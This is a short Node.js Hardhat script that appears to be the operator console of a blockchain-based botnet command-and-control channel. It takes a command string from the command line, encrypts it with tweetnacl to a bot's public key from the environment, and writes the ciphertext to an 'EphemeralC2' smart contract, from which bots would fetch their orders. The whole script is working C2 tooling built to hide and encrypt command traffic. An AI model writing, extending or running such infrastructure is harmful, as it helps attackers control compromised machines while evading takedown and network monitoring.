require("dotenv").config();
const hre = require("hardhat");
const { encodeUTF8, decodeUTF8, decodeBase64, encodeBase64 } = require("tweetnacl-util");
const nacl = require("tweetnacl");

async function main() {
  const command = process.argv[2];
  if (!command) {
    console.error("Please provide a command to send.");
    process.exit(1);
  }

  const contractAddress = process.argv[3];
  if (!contractAddress) {
    console.error("Please provide the EphemeralC2 contract address.");
    process.exit(1);
  }

  const botPubKeyBase64 = process.env.BOT_PUBLIC_KEY;
  if (!botPubKeyBase64) {
    console.error("BOT_PUBLIC_KEY not set in .env.");
    process.exit(1);
  }

  const contract = await hre.ethers.getContractAt("EphemeralC2", contractAddress);

  const botPubKey = decodeBase64(botPubKeyBase64);
  const ephemKeys = nacl.box.keyPair();
  const nonce = nacl.randomBytes(24);

  const encrypted = nacl.box(
    decodeUTF8(command),
    nonce,
    botPubKey,
    ephemKeys.secretKey
  );

  const payload = JSON.stringify({
    epk: encodeBase64(ephemKeys.publicKey),
    nonce: encodeBase64(nonce),
    ciphertext: encodeBase64(encrypted),
  });

  const tx = await contract.setCommand(payload);
  await tx.wait();

  console.log("Command sent and encrypted.");
}

main().catch(console.error);
